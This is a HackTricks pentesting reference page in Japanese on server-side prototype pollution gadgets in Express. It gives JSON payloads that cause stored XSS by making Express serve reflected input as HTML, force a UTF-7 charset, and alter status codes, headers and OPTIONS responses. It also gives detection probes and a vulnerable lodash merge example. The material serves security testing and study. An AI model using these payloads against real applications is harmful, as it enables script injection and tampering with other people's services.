# Express Prototype Pollution Gadgets

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェックしてください！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告掲載したい場合**や**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)で**フォローする**。
* **HackTricks**の[**GitHubリポジトリ**](https://github.com/carlospolop/hacktricks)や[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングテクニックを共有する。

</details>
## XSSレスポンスを提供する

### JSONコンテンツタイプをHTMLに変更する

**JSONコンテンツタイプレスポンス**を使用し、JSONを反映しているExpressアプリケーションで：
```javascript
app.use(bodyParser.json({type: 'application/json'}));
app.post('/', function(req, res){
_.merge({}, req.body);
res.send(req.body);
});
```
これらのケースでは、JSONコンテンツタイプを使用している場合、通常XSSは発生しません。しかし、プロトタイプ汚染を使用すると、**ExpressがHTMLレスポンスを提供するように混乱させることができます。** この脆弱性は、アプリケーションが**`res.send(obj)`** を使用し、application/jsonコンテンツタイプでボディパーサーを使用していることに依存しています。
```json
{"__proto__":{"_body":true,"body":"<script>evil()"}}
```
**`body`** と **`_body`** の両方のプロパティを**汚染する**ことで、**ExpressにHTMLコンテンツタイプを提供させ**、`_body` プロパティを反映させることができ、結果としてストアドXSSが発生します。

### UTF7をレンダリングする

expressに**UTF-7コンテンツをレンダリングさせる**ことが可能です：
```json
{"__proto__":{"content-type": "application/json; charset=utf-7"}}
```
## 安全なスキャン技術

### JSON スペース

以下の PP は、JSON 内の属性に機能を壊さない追加のスペースを作ります：
```json
{"__proto__":{"json spaces": " "}}
```
その後、反映されたJSONは次のようになります：
```json
{"foo":  "bar"} -- Note the extra space
```
### 露出したヘッダー

次のPPガジェットは、サーバーにHTTPヘッダー **`Access-Control-Expose_headers: foo`** を送り返させます。
```json
{"__proto__":{"exposedHeaders":["foo"]}}
```
**CORSモジュールのインストールが必要です**

### **OPTIONSメソッド**

次のペイロードを使用すると、**OPTIONSレスポンスからメソッドを隠すことが可能です**：
```javascript
// Original reponse: POST,GET,HEAD

// Payload:
{"__proto__":{"head":true}}

//New response: POST;GET
```
### **ステータス**

以下のPPペイロードを使用して、**返されるステータスコード**を変更することが可能です：
```json
{"__proto__":{"status":510}}
```
### エラー

プリミティブ（例えば文字列）をプロトタイプに割り当てると、**プロトタイプはオブジェクトでなければならないため、no-op操作が発生します**。`Object.prototype`自体にプロトタイプオブジェクトを割り当てようとすると、**例外がスローされます**。これら2つの振る舞いを利用して、**プロトタイプ汚染が成功したかどうかを検出することができます**：
```javascript
({}).__proto__.__proto__={}//throws type exception
({}).__proto__.__proto__="x"//no-op does not throw exception
```
### 反映された値

アプリケーションがレスポンスでオブジェクトを反映している場合、**奇妙な名前と `__proto__` 属性を持つ属性を作成することができます**。そして、**奇妙な名前の属性のみが反映されている場合**、ウェブが脆弱である可能性があります：
```json
{"hacktricks":"rocks","__proto__":"test"}
```
または、Lodashや類似のライブラリが使用されている場合、**PPを介してプロパティをオブジェクト内に設定する**ことができ、そのプロパティが反映されていない場合は、Lodashがマージされたオブジェクトにプロパティが既に存在するかどうかを現在のオブジェクトを見て判断しているためです：
```javascript
{"__proto__":{"a":"asd"},"a":"asd2","b":"dfg"}
// If only b is reflected then PP in Lodash
```
## その他

### ドットの許可

Expressには**クエリ文字列パラメータからオブジェクトを作成する**ことを可能にするオプションがあります。\
これを利用して**プロトタイプ汚染の脆弱性**を悪用するバグ**チェーン**に確実に使用できます。
```json
{"__proto__":{"allowDots":true}}
```
**`?foo.bar=baz` はNodeでオブジェクトを作成します。**

## 参考文献

* [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSハッキングをゼロからヒーローまで学ぶ</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**、または**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)に**フォローする**。
* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>
